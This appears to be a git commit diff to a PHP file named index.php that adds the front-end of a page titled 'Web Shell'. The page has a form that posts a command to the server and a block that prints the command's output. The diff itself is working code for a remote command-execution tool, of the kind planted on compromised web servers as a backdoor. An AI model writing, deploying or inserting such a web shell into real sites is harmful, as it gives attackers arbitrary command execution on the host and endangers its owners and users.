ae7b5dd3d5f0362341d899e31c55493ee86b452d
Rajya Vardhan <66107299+vardhanrajya08@users.noreply.github.com>
2022-10-25 00:35:00 +0530

    Update index.php

--- index.php
+++ index.php
@@ -18,7 +18,26 @@ if (!empty($_POST['cmd'])) {
 
 <body>
     <main>
-<!--         html and php code -->
+        <h1>Web Shell</h1>
+        <h2>Execute a command</h2>
+
+        <form method="post">
+            <label for="cmd"><strong>Command</strong></label>
+            <div class="form-group">
+                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
+                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
+                <button type="submit">Execute</button>
+            </div>
+        </form>
+
+        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
+            <h2>Output</h2>
+            <?php if (isset($cmd)): ?>
+                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
+            <?php else: ?>
+                <pre><small>No result.</small></pre>
+            <?php endif; ?>
+        <?php endif; ?>
     </main>
 </body>
 </html>
